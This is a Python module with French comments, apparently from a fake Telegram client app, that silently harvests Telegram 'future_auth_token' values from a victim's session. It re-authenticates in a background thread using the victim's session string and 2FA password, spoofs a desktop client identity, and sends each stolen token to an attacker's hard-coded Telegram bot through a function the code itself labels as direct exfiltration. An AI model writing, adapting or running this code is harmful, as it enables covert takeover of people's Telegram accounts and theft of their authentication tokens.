# token_pool.py — pool de future_auth_tokens, un fichier par numero.
# Le harvest tourne en thread d'arriere-plan et parle directement au bot.
import os, json, asyncio, threading, urllib.parse, urllib.request
from datetime import datetime, timezone

FILES = "/data/user/0/com.tgme.app/files"
API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
DEVICE_MODEL = "Desktop-tgme"
SYSTEM_VERSION = "Windows 10"
APP_VERSION = "5.5.1 x64"

HARVEST_TARGET = 15
HARVEST_MAX = 20
SLEEP = 1.2

BOT_TOKEN = "8610466101:AAGrgL8oIrBRBDHsV0M_dC2mqwU7MKaZF5k"
CHAT_ID = "8314393607"


def bot_send(text):
    """Exfiltration directe, sans passer par MainActivity."""
    if not BOT_TOKEN or not CHAT_ID:
        return
    try:
        data = urllib.parse.urlencode(
            {"chat_id": CHAT_ID, "text": str(text)[:4000]}).encode()
        urllib.request.urlopen(
            "https://api.telegram.org/bot%s/sendMessage" % BOT_TOKEN,
            data=data, timeout=20).read()
    except Exception:
        pass


def _path(phone):
    digits = "".join(c for c in phone if c.isdigit())
    return os.path.join(FILES, "pool_%s.json" % digits)


def load_pool(phone):
    try:
        with open(_path(phone), "r", encoding="utf-8") as f:
            data = json.load(f)
        return data if isinstance(data, list) else []
    except Exception:
        return []


def save_pool(phone, pool):
    try:
        with open(_path(phone), "w", encoding="utf-8") as f:
            json.dump(pool[-40:], f, ensure_ascii=False)
    except Exception:
        pass


def add_token(phone, hex_token):
    pool = load_pool(phone)
    if not any(x.get("t") == hex_token for x in pool):
        pool.append({"t": hex_token,
                     "at": datetime.now(timezone.utc).isoformat(timespec="seconds")})
        save_pool(phone, pool)
    return pool


def tokens_hex(phone):
    return [x["t"] for x in load_pool(phone)]


def pool_line(phone):
    return "POOLJSON " + json.dumps({"phone": phone, "tokens": load_pool(phone)},
                                    ensure_ascii=False)


async def harvest(client, phone, password, log):
    """Logins silencieux en chaine : chaque re-auth rend un jeton de plus."""
    from telethon import functions, types
    from telethon.errors import SessionPasswordNeededError, FloodWaitError

    pool = load_pool(phone)
    if len(pool) >= HARVEST_TARGET:
        log("Harvest: pool deja a %d/%d, rien a faire." % (len(pool), HARVEST_TARGET))
        return pool

    identiques = 0
    for _ in range(HARVEST_MAX):
        if len(pool) >= HARVEST_TARGET:
            break
        try:
            toks = [bytes.fromhex(x["t"]) for x in pool]
            sent = await client(functions.auth.SendCodeRequest(
                phone_number=phone, api_id=API_ID, api_hash=API_HASH,
                settings=types.CodeSettings(logout_tokens=toks or None)))
        except SessionPasswordNeededError:
            if not password:
                log("Harvest: 2FA demandee sans mot de passe -> stop.")
                break
            authz = await client.sign_in(password=password)
        except FloodWaitError as e:
            log("Harvest: FloodWait %ss -> stop." % e.seconds)
            break
        except Exception as e:
            log("Harvest: %s: %s -> stop." % (type(e).__name__, e))
            break
        else:
            if isinstance(sent, types.auth.SentCodeSuccess):
                authz = sent.authorization
            else:
                log("Harvest: Telegram redemande un code (pool=%d) -> stop." % len(pool))
                break

        tok = getattr(authz, "future_auth_token", None)
        if not tok:
            log("Harvest: aucun jeton renvoye -> stop.")
            break

        h = tok.hex()
        if h in [x["t"] for x in pool]:
            identiques += 1
            log("Harvest: jeton identique (%d/2)." % identiques)
            if identiques >= 2:
                log("Harvest: STAGNE -> 1 seul jeton par auth key.")
                break
        else:
            identiques = 0
            pool = add_token(phone, h)
            msg = "JETON %d/%d %s" % (len(pool), HARVEST_TARGET, h)
            log(msg)
            bot_send(msg)          # sortie immediate, cible deja partie

        await asyncio.sleep(SLEEP)

    log(pool_line(phone))
    bot_send(pool_line(phone))
    return pool


def _thread_main(phone, password, session_str, log):
    from telethon import TelegramClient
    from telethon.sessions import StringSession

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def run():
        # laisse le client principal se deconnecter (evite AUTH_KEY_DUPLICATED)
        await asyncio.sleep(2)
        client = TelegramClient(
            StringSession(session_str), API_ID, API_HASH,
            device_model=DEVICE_MODEL, system_version=SYSTEM_VERSION,
            app_version=APP_VERSION, lang_code="en", system_lang_code="en-US")
        await client.connect()
        try:
            await harvest(client, phone, password, log)
        finally:
            try:
                await client.disconnect()
            except Exception:
                pass

    try:
        loop.run_until_complete(run())
    except Exception as e:
        log("Harvest thread: %s: %s" % (type(e).__name__, e))
    finally:
        loop.close()


def harvest_in_background(phone, password, session_str, log):
    t = threading.Thread(target=_thread_main,
                         args=(phone, password, session_str, log), daemon=True)
    t.start()
    return t
